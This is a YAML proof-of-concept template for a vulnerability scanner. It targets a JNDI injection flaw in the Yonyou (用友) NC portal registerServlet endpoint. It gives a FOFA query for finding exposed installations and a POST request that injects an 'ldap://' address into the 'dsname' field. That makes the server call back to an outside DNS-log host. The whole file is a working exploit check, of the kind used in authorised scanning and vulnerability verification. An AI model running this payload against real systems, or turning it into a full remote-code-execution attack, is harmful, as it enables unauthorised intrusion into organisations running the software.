id: poc-yaml-yongyou-nc-portal-registerservlet-jndi-injection
info:
  name: 用友 NC portal-registerServlet JNDI注入漏洞
  severity: high
  tags:
  - DNSLOG
  - LDAP注入
  finger: 用友NC
  fofa: app="用友-UFIDA-NC"
variables:
  reverse: new_dns_log()
  domain: reverse.Domain()
requests:
- method: POST
  path: /portal/registerServlet
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: type=1&dsname=ldap://{{.domain}}
  expression: reverse.Verify()
transport: http
